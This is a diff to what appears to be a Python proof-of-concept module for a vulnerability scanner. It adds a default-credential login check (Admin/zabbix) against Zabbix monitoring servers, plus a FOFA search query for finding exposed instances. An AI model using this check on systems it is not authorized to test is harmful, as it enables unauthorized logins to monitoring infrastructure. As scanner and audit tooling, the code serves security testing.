@@ -18,8 +18,8 @@ class POC(POCBase):
         """,                                # POC描述，写更新描述，没有就不写
 
         "name" : "Zabbix弱口令",                        # 漏洞名称
-        "VulnID" : "Blen-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "",                     # 漏洞应用名称
+        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "Zabbix",                     # 漏洞应用名称
         "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
@@ -27,7 +27,7 @@ class POC(POCBase):
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-        
+            app="ZABBIX-监控系统"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -43,19 +43,26 @@ class POC(POCBase):
         """
         vuln = [False,""]
         url = self.target + "" # url自己按需调整
-        
+        data = "name=Admin&password=zabbix&autologin=1&enter=Sign+in"
 
-        headers = {"User-Agent":get_random_ua(),
+        headers = {
+                    "User-Agent":get_random_ua(),
                     "Connection":"close",
-                    # "Content-Type": "application/x-www-form-urlencoded",
+                    "Content-Type": "application/x-www-form-urlencoded",
                     }
         
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "自己调整":#req.status_code == 200 and :
+            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+            if "chkbxRange.init();" in req.text \
+                and \
+                    "incorrect" not in req.text \
+                        and \
+                            "<!-- Login Form -->" not in req.text \
+                                and \
+                                    req.status_code == 200:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
